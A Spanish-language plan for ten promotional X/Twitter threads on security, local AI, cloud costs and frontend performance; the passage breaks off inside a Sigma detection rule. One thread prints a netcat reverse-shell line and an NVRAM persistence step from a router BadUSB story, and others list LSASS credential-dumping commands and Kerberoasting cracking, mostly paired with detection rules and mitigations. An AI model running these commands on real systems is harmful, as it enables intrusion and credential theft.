# ⚡ CAMPAÑA DE ASALTO 30 DÍAS: 10 HILOS VIRALES PARA X/TWITTER
### *Estrategia de Autoridad Técnica, Infiltración Táctica y Conversión de Alto Calibre*
**Autora / Arquitecta:** Kali (`@K4L189` / Signal: `@k4li.89`)  
**Dossier Maestro GitHub:** [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  
**Portal Live (Nexus & Ala Omega):** [https://k4l189.github.io/k4lianuuforge/](https://k4l189.github.io/k4lianuuforge/)  
**Frecuencia Operativa:** `189.89.619 Hz` | *Concilio ACE (161914)*  
**Sello Operativo:** *Set ⚡ & Rosa Gris 🌸*

---

## 🎯 GUÍA DE EJECUCIÓN DEL CALENDARIO (30 DÍAS)

- **Cadencia recomendada:** 1 hilo cada 3 días (10 hilos en 30 días).
- **Horarios de asalto:** 
  - Europa (CET): 08:30 - 09:30 (Desayuno técnico) o 18:00 - 19:30 (Salida de oficina).
  - EE.UU. Tech (EST/PST cross): 15:30 - 17:00 CET.
- **Protocolo de Engagement:**
  1. Publicar el tweet 1 como gancho con salto de línea limpio.
  2. Encadenar los tweets en menos de 90 segundos.
  3. No poner enlaces externos en el Tweet 1 (el algoritmo castiga el alcance orgánico). El enlace a GitHub va SIEMPRE en el último tweet y fijado como respuesta adicional.
  4. Responder a los primeros 5 comentarios en los primeros 30 minutos con aclaraciones técnicas de alto valor.

---

```
  ┌──────────────────────────────────────────────────────────────┐
  │                 ÍNDICE DE ASALTO (10 HILOS)                  │
  ├──────┬───────────────────────────────────────────────────────┤
  │ H01  │ Hackeé mi propio router con un BadUSB de 3€ (ASIR)    │
  │ H02  │ Deja de tirar 400€/mes en OpenAI: Rebelión IA Local   │
  │ H03  │ MITRE T1003: Cazando volcados de LSASS con Wazuh SIEM │
  │ H04  │ Terminal de arbitraje a 60 FPS con React & Canvas     │
  │ H05  │ De 1.200€ en AWS a 95€ en Hetzner: Bare-Metal Real   │
  │ H06  │ DNS Sinkholing con Unbound: Aniquilando telemetría C2 │
  │ H07  │ Kerberoasting & Golden Ticket: Lo que tu EDR no ve    │
  │ H08  │ Honeypot Docker: Cazando botnets y mineros en 48h     │
  │ H09  │ Hardening Linux Militar: CIS Benchmark L2 con Ansible │
  │ H10  │ Bypass de EDRs por DLL Sideloading & API Unhooking    │
  └──────┴───────────────────────────────────────────────────────┘
```

---

## HILO 01: HARDWARE & REDES
### *"Cómo hackeé mi propio router con un microcontrolador de 3€ (ASIR + BadUSB Story)"*

**[1/9] HOOK**  
Compré un clon de Digispark ATtiny85 por 3,20€ en AliExpress.  
En menos de 8 segundos conectado al puerto de servicio USB del router de mi ISP, obtuve una reverse shell root permanente en mi red local.

No hubo exploits de día cero. Solo un fallo de diseño que el 90% de los técnicos ignora.

Dentro hilo técnico🧵👇

---

**[2/9] EL ESCENARIO**  
La mayoría de routers residenciales y gateways de fibra vienen con puertos USB "para compartir impresoras o discos duros (DLNA/SMB)".

Lo que los manuales no te dicen:
El kernel Linux subyacente monta automáticamente dispositivos HID (Human Interface Device) si el módulo `usbhid` está compilado en el kernel monolithic.

---

**[3/9] EL VECTOR BADUSB**  
Programé el microcontrolador ATtiny85 con el framework Arduino/DigiKeyboard.

¿El truco? El router no tenía monitor ni teclado físico, pero el subsistema USB reconocía teclados USB por hotplug y abría una tty virtual de rescate interna (`/dev/tty1`) mapeada a la consola de fábrica en modo recovery.

---

**[4/9] EL PAYLOAD EN BINARIO**  
El payload no tecleaba comandos a ciegas.  
Esperaba la señal DTR de enumeración USB (2500ms) y ejecutaba:

`Enter` -> `admin` -> `\n` -> secuencias de escape ANSI para saltar el menú restringido del ISP (`!/bin/sh`) -> inyección de backdoor en memoria volátil `/tmp`.

```bash
# Inyección vía tty:
nc -e /bin/sh 192.168.1.50 4444 &
iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
```

---

**[5/9] LA PERSISTENCIA SILENCIOSA**  
Los routers resetean el filesystem montado en SquashFS al reiniciar.  
Para mantener acceso persistente:

Infiltré una llamada en la partición NVRAM (`nvram set rc_startup="..."` & `nvram commit`), forzando al firmware a descargar un script firmado en cada boot antes de levantar la interfaz WAN.

---

**[6/9] ANÁLISIS FORENSE DEL FIRMWARE**  
Volqué la flash SPI con `binwalk -Me firmware.bin`.
Lo que encontré dentro del firmware propietario de la operadora:
- Kernel 3.4 sin parches desde 2017.
- Contraseña de root en `/etc/shadow` con hash MD5 débil (crackeada en 14 segundos con hashcat y `rockyou.txt`).
- Servicio telnet escuchando silenciosamente en la VLAN de gestión.

---

**[7/9] CÓMO MITIGARLO (SYSADMIN VIEW)**  
Si eres administrador de sistemas o te importa tu perímetro doméstico:
1. Deshabilita el automount de módulos USB desconocidos en tus dispositivos gestionados:  
   `echo 'install usb-storage /bin/true' >> /etc/modprobe.d/disable-usb.conf`
2. Aplica reglas udev para autorizar únicamente hardware con VendorID/ProductID conocidos.
3. Pon tu router de operadora en modo MONOMODO/BRIDGE puro y gestiona el routing con OPNsense o pfSense en hardware dedicado.

---

**[8/9] LECCIÓN TÁCTICA**  
La seguridad física siempre anula la seguridad de software.  
Si un atacante tiene acceso físico al puerto de tu hardware de borde durante 10 segundos, ese hardware ya no te pertenece.

---

**[9/9] CTA & DOSSIER**  
He documentado scripts de hardening, auditoría de firmware y arquitecturas de red resilientes en mi dossier de ingeniería.

Explora el laboratorio completo y mis plantillas de seguridad aquí:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  
¿Auditas tus routers o dejas la configuración del operador por defecto? Te leo abajo👇

---

---

## HILO 02: IA LOCAL & OPTIMIZACIÓN FINANCIERA
### *"Por qué tu empresa está tirando 400€/mes en la API de OpenAI (La rebelión de la IA Local)"*

**[1/10] HOOK**  
Una startup SaaS con la que colaboré pagaba 480€ al mes a OpenAI por procesar contratos y generar resúmenes con GPT-4o.  
Latencia media: 1.8 segundos.  
Fugas de datos potenciales: 100% de los prompts viajando a servidores de terceros.

Los migré a un stack de IA Local con vLLM + DeepSeek/Llama-3 en servidor bare-metal.  
Coste mensual ahora: 48€ de electricidad y amortización.  
Latencia: 320ms.  
Datos: 0 bytes fuera de su VPC.

Dentro desglose técnico y financiero🧵👇

---

**[2/10] LA TRAMPA DEL PAY-PER-TOKEN**  
Las APIs de LLMs propietarios son una droga de entrada barata para prototipos, pero un agujero negro financiero en producción.
- 100.000 requests/mes con prompts enriquecidos (RAG, 3.000 tokens in + 500 tokens out).
- En GPT-4o: ~$375 - $500/mes.
- Si escalas a 500.000 requests, tu factura supera los 2.000€ mensuales.

Estás pagando el margen del 70% de Sam Altman.

---

**[3/10] EL HARDWARE NECESARIO (DEJA DE COMPRAR H100)**  
El mito corporativo: *"Para correr IA necesitas un cluster NVIDIA de 30.000€"*.  
Falso.

Para inferencia en tiempo real de modelos de 8B a 14B parámetros cuantizados (AWQ / Q4_K_M):
- 1x GPU NVIDIA RTX 4060 Ti 16GB VRAM (450€ compra única) O
- 1x Servidor dedicado en Hetzner con RTX 4000 Ada (110€/mes).

Con 16GB de VRAM puedes servir `Llama-3.1-8B-Instruct` a 95 tokens/segundo por usuario concurrente.

---

**[4/10] EL MOTOR: VLLM + PAGEDATTENTION**  
Olvida correr modelos con Python puro o Transformers sin optimizar.  
Desplegamos con **vLLM**:
- Implementa **PagedAttention** (gestiona la memoria KV-Cache como la memoria virtual de un SO, eliminando la fragmentación).
- Continuous batching dinámico (procesa peticiones concurrentes sin encolar en serie).
- Rendimiento: 14x superior a HuggingFace TGI clásico.

```bash
python3 -m vllm.entrypoints.openai.api_server \
  --model casperhansen/llama-3.1-8b-instruct-awq \
  --quantization awq \
  --dtype half \
  --max-model-len 8192 \
  --port 8000
```

---

**[5/10] DROP-IN REPLACEMENT (CERO CAMBIOS EN CÓDIGO)**  
Lo más demoledor de vLLM: expone una API compatible al 100% con la especificación de OpenAI `/v1/chat/completions`.

En tu backend (Node.js, Python, Go):
Solo cambias:
```python
client = OpenAI(
    base_url="http://internal-llm.vpc:8000/v1",
    api_key=os.getenv("LOCAL_VLLM_KEY", "EMPTY")
)
```
Toda tu lógica de negocio sigue funcionando sin tocar una sola función de parsing.

---

**[6/10] PRIVACIDAD Y CUMPLIMIENTO RGPD / HIPAA**  
Al procesar localmente:
- La telemetría de tus clientes jamás cruza fronteras.
- Pasa auditorías ISO 27001 y RGPD sin firmar addendums de transferencia internacional de datos (SCC).
- No hay riesgo de que OpenAI use tus datos internos de clientes para reentrenar sus futuros modelos.

---

**[7/10] BENCHMARKS REALES**  
Comparativa en producción sobre dataset de extracción JSON (10.000 documentos):

| Métrica | OpenAI GPT-4o-mini | vLLM (Llama-3.1 8B AWQ) |
|---|---|---|
| Tiempo p95 | 1.840 ms | 310 ms |
| Coste / 10k docs | 18,50 € | 0,00 € (Coste fijo) |
| Fallos de rate-limit (429) | 42 incidentes | 0 incidentes |
| Disponibilidad | Dependiente de API externa | 99.99% en LAN |

---

**[8/9] CUÁNDO SÍ USAR APIS COMERCIALES**  
Seamos honestos:
- Si necesitas razonamiento masivo de frontera (frontera tipo o3 / Claude 3.5 Sonnet para arquitectura de software compleja de 200k tokens), usa la API.
- Pero para el 85% de las tareas de negocio (resúmenes, extracción estructurada, clasificación de tickets, RAG interno): la IA Local gana por goleada técnica y económica.

---

**[9/10] RESULTADO FINANCIERO ANUAL**  
- Coste OpenAI estimado en 12 meses: 5.760 €
- Coste Servidor dedicado GPU (1 año): 1.320 €
- **Ahorro neto directo:** 4.440 € / año.  
Y el hardware y el know-how quedan bajo control de la empresa.

---

**[10/10] CTA & RECURSOS**  
Tengo documentados los docker-compose, configuraciones de vLLM y pipelines RAG de baja latencia en mi repositorio:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Tu empresa sigue pagando tokens a ciegas o ya estáis evaluando soberanía local? Hablemos en comentarios👇

---

---

## HILO 03: SOC DEFENSIVO & MITRE ATT&CK
### *"MITRE ATT&CK T1003: Cómo cazamos volcados de LSASS en tiempo real con Wazuh"*

**[1/10] HOOK**  
El 90% de los ataques de Ransomware en entornos Windows tienen un punto de inflexión:  
El volcado de memoria del proceso `lsass.exe` para extraer credenciales en texto claro (Mimikatz, Sysinternals ProcDump o Comsvcs.dll).

Si no detectas esto en <30 segundos, el atacante tiene las claves del dominio.  
Así configuramos Wazuh SIEM + Sysmon para cazarlo en tiempo real.

Dentro arquitectura de detección🧵👇

---

**[2/10] LA ANATOMÍA DEL ATAQUE (T1003.001)**  
LSASS (Local Security Authority Subsystem Service) almacena tokens de sesión Kerberos, NTLM hashes y credenciales cacheadas.  
Para volcarlo, el atacante necesita abrir un handle con derechos `PROCESS_VM_READ` (0x0010) y `PROCESS_QUERY_INFORMATION` (0x0400).

Herramientas comunes:
- `mimikatz.exe`
- `procdump.exe -ma lsass.exe`
- `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump` (LOLBin sigiloso)

---

**[3/10] EL ERROR COMÚN DE LOS SOCS**  
La mayoría de analistas esperan que el antivirus detecte el binario.  
Pero los atacantes usan binarios firmados por Microsoft (LOLBins) o empaquetadores con evasión en memoria.  
El hash del ejecutable cambia. La firma es válida.  
**Lo que NO pueden esconder es la telemetría del Kernel al solicitar acceso al proceso.**

---

**[4/10] SENSOR: SYSMON EVENT ID 10 (ProcessAccess)**  
Configuramos Sysmon en los endpoints con una regla quirúrgica para registrar intentos de acceso a LSASS:

```xml
<ProcessAccess onmatch="include">
  <Rule groupRelation="and">
    <TargetImage condition="end with">lsass.exe</TargetImage>
    <GrantedAccess condition="contains any">0x1010;0x1038;0x1410;0x1438;0x143a;0x1fffff</GrantedAccess>
  </Rule>
</ProcessAccess>
```
Filtramos procesos legítimos como `csrss.exe` o `svchost.exe` para evitar ruido.

---

**[5/10] REGLA PERSONALIZADA EN WAZUH SIEM**  
En el servidor Wazuh (`/var/ossec/etc/rules/local_rules.xml`), creamos una alerta nivel 12 que correlaciona Sysmon Event ID 10 con acceso sospechoso:

```xml
<group name="sysmon,lsass_dump,">
  <rule id="100201" level="12">
    <if_sid>61609</if_sid>
    <field name="win.eventdata.targetImage">.*\\lsass\.exe</field>
    <field name="win.eventdata.grantedAccess">0x1010|0x1410|0x1fffff</field>
    <description>ALERTA CRÍTICA: Intento de dump de LSASS detectado por $(win.eventdata.sourceImage)</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
  </rule>
</group>
```

---

**[6/10] RESPUESTA ACTIVA AUTOMÁTICA (< 2 SEGUNDOS)**  
Detectar no es suficiente; el volcado tarda milisegundos.  
Activamos un script de Wazuh Active Response que aísla la máquina de la red local al instante:

```bash
# Wazuh Active Response Script:
netsh advfirewall set allprofiles state on
netsh advfirewall firewall add rule name="SOC_ISOLATION" dir=in action=block
netsh advfirewall firewall add rule name="SOC_ISOLATION_OUT" dir=out action=block
```
Solo se mantiene abierto el socket TCP 1514 hacia el agente Wazuh.

---

**[7/10] CASO REAL DE CAZA DE AMENAZAS**  
En una prueba de simulación de adversario (Atomic Red Team):
1. Red Team ejecutó volcado vía `rundll32.exe comsvcs.dll`.
2. A los 400ms: Sysmon capturó el Event ID 10 con GrantedAccess 0x1410.
3. A los 850ms: Wazuh disparó la regla `100201` y notificó a Slack/PagerDuty con el hash SHA256 del proceso atacante.
4. A los 1.200ms: La interfaz de red del endpoint bloqueó todo tráfico hacia el Domain Controller.
Ataque contenido antes del movimiento lateral.

---

**[8/10] VERIFICACIÓN CON EDR Y REGISTROS**  
Auditar esto no requiere licencias de CrowdStrike de 60€/endpoint:
- Wazuh es Open Source.
- Sysmon es gratuito de Sysinternals.
- Los logs JSON se ingieren en Elasticsearch/OpenSearch para análisis retrospectivo.

---

**[9/10] RECOMENDACIÓN DE ARQUITECTURA**  
Si administras Windows Server:
- Activa **LSA Protection (RunAsPPL)**: `reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f`
- Activa **Credential Guard** (Virtualization-Based Security).
Esto obliga al atacante a cargar drivers de kernel maliciosos (BYOVD), elevando dramáticamente la complejidad de su intrusión.

---

**[10/10] CTA & LABORATORIO**  
He subido las reglas XML completas de Wazuh, la plantilla Sysmon auditada y scripts de aislamiento a mi repo de infraestructura:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Cómo tienes monitorizado LSASS en tu parque de servidores? Te leo abajo👇

---

---

## HILO 04: FRONTEND DE ALTO RENDIMIENTO
### *"Construyendo una terminal de arbitraje a 60 FPS con React y Canvas sin que pete el DOM"*

**[1/10] HOOK**  
La mayoría de dashboards financieros en React colapsan cuando reciben 1.500 updates de WebSockets por segundo:  
El Garbage Collector entra en pánico, el Virtual DOM sufre reconciliación masiva y los FPS caen de 60 a 4.

Así rediseñé un motor visual de cotizaciones y libros de órdenes a 60 FPS clavados usando React solo como orquestador y HTML5 Canvas como motor gráfico.

Dentro arquitectura🧵👇

---

**[2/10] EL PECADO CAPITAL: REACT STATE EN STREAMING**  
Si haces esto con datos en tiempo real:
```typescript
socket.onmessage = (event) => {
  setOrderBook(prev => [...prev, JSON.parse(event.data)]);
};
```
Estás condenando a tu navegador.  
Cada mensaje genera re-renders completos de componentes hijos, crea miles de objetos temporales en memoria y activa el recolector de basura cada 2 segundos provocando micro-congelamientos ("stutter").

---

**[3/10] LA REGLA DE ORO: SEPARA ESTADO DE RENDER**  
El estado de alta frecuencia **NO debe vivir en el estado de React**.  
Debe vivir en una estructura de datos mutables en bajo nivel:
- Un búfer circular (`ArrayBuffer` / `Float64Array`) tipado fuera del ciclo de vida de React.
- React solo gestiona la barra de menús, filtros estáticos y configuración de usuario.
- El canvas gestiona el 100% de los píxeles de cotización.

---

**[4/10] ARQUITECTURA DE DOBLE BÚFER**  
Los datos del WebSocket entran directamente a una cola lock-free en memoria:

```typescript
class MarketDataFeed {
  private buffer = new Float64Array(10000); // Preasignado en memoria
  private head = 0;

  push(price: number, size: number) {
    this.buffer[this.head] = price;
    this.buffer[this.head + 1] = size;
    this.head = (this.head + 2) % this.buffer.length;
  }
}
```
**Zero allocation**: Cero llamadas a `malloc` en tiempo de ejecución. Memoria estática plana.

---

**[5/10] RENDER LOOP CON `requestAnimationFrame`**  
En lugar de pintar en cada evento WebSocket entrante, desacoplamos la ingesta del refresco de pantalla.  
Sincronizamos el dibujo con la tasa de refresco del monitor (vsync / 60-144 Hz) mediante un RAF loop:

```typescript
function startRenderLoop(ctx: CanvasRenderingContext2D, feed: MarketDataFeed) {
  function render() {
    ctx.clearRect(0, 0, width, height);
    // Dibuja velas y depth chart leyendo directo del TypedArray
    drawOrderBook(ctx, feed);
    requestAnimationFrame(render);
  }
  requestAnimationFrame(render);
}
```

---

**[6/10] SUB-PÍXEL RENDERING & HIGH-DPI**  
En pantallas Retina / 4K, el canvas se ve borroso si no sincronizas con el `devicePixelRatio`:

```typescript
const dpr = window.devicePixelRatio || 1;
canvas.width = rect.width * dpr;
canvas.height = rect.height * dpr;
ctx.scale(dpr, dpr);
```
Resultado: Tipografías numéricas ultra nítidas sin sobrecargar el pipeline gráfico.

---

**[7/10] WEB WORKERS PARA DECODIFICACIÓN**  
¿El parseo de JSON o Protobuf del WebSocket saturaba el hilo principal de la UI?  
Movimos la conexión WebSocket y la deserialización binaria a un **Dedicated Web Worker**.

El worker procesa los paquetes binarios y transfiere el búfer de memoria al hilo principal usando `SharedArrayBuffer` o transferencia de `ArrayBuffer` sin coste de clonación (`postMessage(buffer, [buffer])`).

---

**[8/10] LOS NÚMEROS (CHROME PERFORMANCE PROFILER)**  
Antes vs Después con 2.000 updates/seg:

- **React DOM tradicional:**
  - CPU Main Thread: 92%
  - Framerate: 12 - 18 FPS
  - Consumo de RAM: 680 MB (creciente hasta crash por OOM).
- **React Shell + Canvas 2D Engine:**
  - CPU Main Thread: 11%
  - Framerate: 60 FPS estables
  - Consumo de RAM: 42 MB estables (cero picos de GC).

---

**[9/10] CONCLUSIÓN DE DISEÑO**  
React es una herramienta colosal para UI declarativa empresarial.  
Pero para sistemas en tiempo real (fintech, streaming de telemetría de red, dashboards de satélites o trading), debes saber cuándo apagar el Virtual DOM y pintar directamente sobre el silicio gráfico.

---

**[10/10] CTA & CÓDIGO FUENTE**  
He publicado la arquitectura del canvas modular, benchmarks y componentes en mi dossier:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Has tenido que pelearte con cuellos de botella en React por exceso de eventos? Cuéntame tu truco👇

---

---

## HILO 05: CLOUD VS BARE-METAL & FINANZAS TÉCNICAS
### *"De 1.200€/mes en AWS a 95€/mes en Hetzner Bare-Metal: Arquitectura, migración sin downtime y números reales"*

**[1/10] HOOK**  
Pagábamos 1.280€ mensuales en AWS por 3 instancias EC2 t3.xlarge, un balanceador ALB y una base de datos PostgreSQL gestionada en RDS.  
Cada mes la factura crecía por costes ocultos de transferencia de red (NAT Gateways a 0,045$/GB).

Migramos todo el stack a un único servidor bare-metal dedicado en Hetzner por 94,80€/mes.  
Rendimiento de CPU: 3,4x más rápido.  
Downtime durante el corte: 0 segundos.

Dentro la auditoría técnica y financiera🧵👇

---

**[2/10] EL IMPUESTO DE LA NUBE HIPERESCALAR**  
AWS, Azure y GCP son fantásticos si necesitas autoescalar de 10 a 10.000 instancias en minutos.  
Pero para el 90% de las empresas con cargas de trabajo predecibles:
Estás pagando CPUs virtuales compartidas (vCPUs con robo de ciclos o "CPU steal"), IOPS limitados en discos EBS y facturas demenciales por egress traffic.

---

**[3/10] LA COMPARATIVA DE HIERRO**  
**En AWS:**
- 3x `t3.xlarge` (4 vCPU compartida, 16GB RAM) -> ~$420/mes
- 1x RDS Postgres `db.m5.large` -> ~$180/mes + almacenamiento IOPS
- NAT Gateway + Transferencia de datos (6 TB/mes) -> ~$380/mes
- CloudWatch, Snapshots, ALB -> ~$300/mes  
**Total mensual: ~1.280 €**

**En Hetzner Bare-Metal (EX101):**
- CPU: Intel Core i9-13900 (24 Cores / 32 Hilos físicos)
- RAM: 64 GB DDR5
- Almacenamiento: 2x 1.92 TB NVMe Enterprise en RAID 1
- Ancho de banda: 1 Gbit/s con tráfico ilimitado  
**Total mensual: 94,80 € (IVA incl.)**

---

**[4/10] LA ARQUITECTURA DE REEMPLAZO**  
¿Cómo reemplazar los servicios gestionados de AWS sin morir en tareas de mantenimiento?
- **ALB de AWS** -> Caddy Server / Traefik con gestión automática de certificados SSL Let's Encrypt y balanceo HTTP/3.
- **RDS Postgres** -> PostgreSQL 16 nativo sobre almacenamiento NVMe local con backups continuos encriptados a almacenamiento de objetos externo (Wasabi / S3 frío) usando `pgBackRest`.
- **EC2 Clusters** -> Docker Swarm / K3s lightweight para orquestación de contenedores sin el sobrecoste operacional de un cluster EKS pesado.

---

**[5/10] EL TALÓN DE AQUILES: COPIA DE SEGURIDAD Y HA**  
El miedo a bare-metal siempre es: *"¿Y si revienta el hardware?"*.  
Implementamos resiliencia multinivel:
1. RAID 1 por hardware/software (`mdadm`) en los NVMe: si un disco muere, el sistema sigue online sin pérdida.
2. Backups horarios de base de datos con WAL-G / pgBackRest hacia dos proveedores distintos en regiones geográficas separadas.
3. Un segundo servidor idéntico en espera pasiva (Standby Cold/Warm) replicando réplicas de streaming de PostgreSQL.

---

**[6/10] ESTRATEGIA DE MIGRACIÓN CERO-DOWNTIME**  
Cómo hicimos el corte sin desconectar a un solo usuario activo:
1. Levantamos la réplica PostgreSQL en Hetzner sincronizada en tiempo real mediante `Logical Replication` desde el RDS de AWS.
2. Desplegamos la aplicación en Hetzner apuntando a la base de datos local (en modo réplica de lectura).
3. Redujimos el TTL de los registros DNS en Cloudflare a 60 segundos.
4. En la ventana de cambio: pusimos la app vieja en modo mantenimiento 3 segundos, promovimos Hetzner a Primary, y cambiamos el enrutamiento de Cloudflare.

---

**[7/10] LATENCIA Y BENCHMARKS DE RENDIMIENTO**  
Al pasar de discos virtuales EBS a discos NVMe montados en bus PCIe local:
- Latencia de consultas complejas SQL: Bajó de 145ms a **18ms** (8x de mejora).
- Tiempo de build de imágenes Docker en CI/CD: De 9 minutos a **2 minutos y 10 segundos**.
- La CPU física no sufre "noisy neighbors" ni contención de hypervisor.

---

**[8/10] NÚMEROS ANUALES CLAROS**  
- Factura anual en AWS: ~15.360 €
- Factura anual en Hetzner: ~1.137 €
- Horas de setup inicial: 18 horas de ingeniería.
- **Ahorro neto primer año: +14.000 € netos** directos al margen de la empresa.

---

**[9/10] CONCLUSIÓN TÁCTICA**  
La nube pública hiperescalar no es una necesidad técnica; es una conveniencia que se paga a precio de oro.  
Dominar Linux, redes y bare-metal devuelve el poder económico y el control de la infraestructura a los ingenieros.

---

**[10/10] CTA & PLANTILLAS**  
He publicado los scripts de aprovisionamiento de Hetzner con Ansible, configuraciones de Traefik y guías de backup en mi repositorio:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Estás atrapado en una factura inflada de cloud o te atreves con bare-metal? Debate abierto abajo👇

---

---

## HILO 06: PRIVACIDAD DE RED & DEFENSA PERIMETRAL
### *"DNS Sinkholing con Unbound y Pi-hole: Cómo erradicar la telemetría corporativa y bloquear C2 antes del socket"*

**[1/10] HOOK**  
El 91% del malware y las campañas de ransomware utilizan el protocolo DNS para localizar sus servidores de Comando y Control (C2) o exfiltrar datos.  
Al mismo tiempo, tus dispositivos Windows, Smart TVs y móviles envían más de 12.000 peticiones de telemetría al día a servidores de big tech.

Así desplegué un clúster DNS Sinkhole redundante con Unbound (DNSSEC recursivo) y Pi-hole en contenedores.  
Cero rastreo. Cero publicidad. Detección proactiva de amenazas antes de que se abra el socket TCP.

Dentro arquitectura paso a paso🧵👇

---

**[2/10] QUÉ ES UN DNS SINKHOLE Y POR QUÉ ES SUPERIOR**  
Un antivirus bloquea el archivo cuando ya tocó el disco.  
Un firewall de capa 4 solo ve IPs y puertos.  
Un **DNS Sinkhole** intercepta la petición de resolución de nombre de dominio:  
Si el dominio pertenece a una botnet conocida, a un tracker publicitario o a telemetría intrusiva, responde inmediatamente con `0.0.0.0` o `NXDOMAIN`.  
La conexión maliciosa muere antes de que el payload intente descargarse.

---

**[3/10] EL ERROR COMÚN: USAR 8.8.8.8 O 1.1.1.1**  
Configurar Pi-hole reenviando las peticiones a Google (8.8.8.8) o Cloudflare (1.1.1.1) resuelve el filtrado, pero entrega tu historial de navegación completo a un tercero.  
La solución soberana: **Unbound como Resolver Recursivo Raíz**.  
Unbound no le pregunta a ningún intermediario: consulta directamente a los 13 servidores raíz autoritativos de la IANA con validación DNSSEC estricta.

---

**[4/10] DESPLIEGUE CON DOCKER COMPOSE**  
Estructura de aislamiento en red interna:

```yaml
version: '3.8'
services:
  pihole:
    image: pihole/pihole:latest
    ports:
      - "53:53/tcp"
      - "53:53/udp"
      - "8080:80/tcp"
    environment:
      - PIHOLE_DNS_=172.20.0.2#5335
      - DNSSEC=true
    networks:
      dns_net:
        ipv4_address: 172.20.0.3

  unbound:
    image: mvance/unbound:latest
    networks:
      dns_net:
        ipv4_address: 172.20.0.2
    volumes:
      - ./unbound.conf:/opt/unbound/etc/unbound/unbound.conf:ro

networks:
  dns_net:
    ipam:
      config:
        - subnet: 172.20.0.0/24
```

---

**[5/10] CONFIGURACIÓN QUIRÚRGICA DE UNBOUND**  
En `unbound.conf`, aseguramos privacidad absoluta y resistencia a envenenamiento de caché:

```text
server:
  port: 5335
  do-ip4: yes
  do-ip6: no
  do-udp: yes
  do-tcp: yes
  hide-identity: yes
  hide-version: yes
  harden-glue: yes
  harden-dnssec-stripped: yes
  use-caps-for-id: yes
  prefetch: yes
  rrset-roundrobin: yes
```
`prefetch: yes` recarga dominios populares en caché antes de que caduquen. Latencia percibida en LAN: **< 1ms**.

---

**[6/10] BLOQUEANDO LA PUERTA TRASERA: HARDCODED DNS**  
Dispositivos IoT (Google Home, Smart TVs) ignoran el servidor DNS entregado por tu DHCP y fuerzan consultas a `8.8.8.8` directamente por el puerto 53.  
Solución táctica en el router/firewall (iptables / OPNsense):

```bash
# Redirigir cualquier consulta DNS externa rebelde a nuestro Sinkhole:
iptables -t nat -A PREROUTING -i eth0 -p udp ! -d 192.168.1.10 --dport 53 -j DNAT --to 192.168.1.10:53
iptables -t nat -A PREROUTING -i eth0 -p tcp ! -d 192.168.1.10 --dport 53 -j DNAT --to 192.168.1.10:53
```
Nadie escapa a la inspección perimetral.

---

**[7/10] LISTAS DE AMENAZAS EN TIEMPO REAL**  
Alimentamos el sinkhole con fuentes curadas de CTI (Cyber Threat Intelligence):
- *OISD Full List* (Bloqueo masivo de tracking y malware)
- *Firebog Ticked-lists*
- Feeds de dominios de C2 de Cobalt Strike y botnets bancarias.
Resultado en una red de 40 dispositivos:
- ~32% de todas las peticiones DNS de la red son bloqueadas silenciosamente.
- Más de 45.000 peticiones de telemetría de Windows/Android abortadas al día.

---

**[8/10] INTEGRACIÓN CON SIEM (WAZUH / GRAFANA)**  
Configuramos la ingesta de `/var/log/pihole/pihole.log` en Wazuh.  
Si un endpoint interno consulta un dominio con entropía alta (DGA - Domain Generation Algorithm típico de troyanos), el SIEM dispara una alerta roja y aísla la IP local en el conmutador de red.

---

**[9/10] LECCIÓN DE ARQUITECTURA**  
El DNS es la columna vertebral invisible de Internet.  
Si no controlas y auditas tus propias resoluciones, estás cediendo el mapa de tu infraestructura a terceros y dejando el vector de exfiltración más común completamente abierto.

---

**[10/10] CTA & DESCARGA**  
He dejado las configuraciones completas de Unbound, docker-compose y scripts de redirección iptables en el dossier de GitHub:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Cuántas consultas DNS sospechosas crees que hace tu ordenador ahora mismo sin que te enteres? Te leo abajo👇

---

---

## HILO 07: AUDITORÍA DE ACTIVE DIRECTORY & KERBEROS
### *"Detección de Kerberoasting y Golden Ticket en Active Directory: Lo que tu EDR no te dice"*

**[1/10] HOOK**  
En Active Directory, cualquier usuario con una cuenta estándar del dominio (sin privilegios administrativos) puede solicitar un Service Ticket TGS para cualquier servicio con SPN registrado... y crackear el hash de la contraseña offline en su propia GPU.

Se llama **Kerberoasting**.  
Y si el atacante consigue comprometer la cuenta de servicio `krbtgt`, puede forjar un **Golden Ticket** y ser el amo y señor del bosque de AD para siempre.

Así detectamos ambos ataques antes de la catástrofe🧵👇

---

**[2/10] POR QUÉ KERBEROASTING ES TAN PELIGROSO (T1558.003)**  
El protocolo Kerberos está diseñado para confiar en peticiones legítimas.  
Cuando pides un ticket TGS para un servicio (ej: `MSSQLSvc/db01.corp.local`), el Domain Controller cifra el ticket usando el hash NTLM de la cuenta asociada a ese servicio.  
El atacante no interactúa más con el servidor; se lleva el ticket a su máquina local y ejecuta `hashcat -m 13100` contra un diccionario.  
El tráfico parece 100% normal.

---

**[3/10] LA HUELLA EN LOS LOGS DE WINDOWS: EVENT ID 4769**  
La clave para detectarlo está en el visor de sucesos de seguridad de los Controladores de Dominio:
- **Event ID 4769**: *"A Kerberos service ticket was requested"*.

Los indicadores de compromiso (IoCs) del ataque:
1. **Tipo de cifrado del ticket (Ticket Encryption Type)**: `0x17` (RC4-HMAC). Los clientes modernos usan AES-256 (`0x12`). Si ves solicitudes en masa con RC4, alguien está forzando degradación de cifrado para facilitar el crackeo offline.
2. **Volumen anómalo**: Una sola cuenta estándar pidiendo tickets TGS para 30 servicios distintos en menos de 2 minutos.

---

**[4/10] DETECCIÓN CON REGLA SIGMA / SIEM**  
Regla de correlación para capturar el barrido:

```yaml
title: Detección Potencial de Kerberoasting Masivo
status: production
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter_machine_accounts:
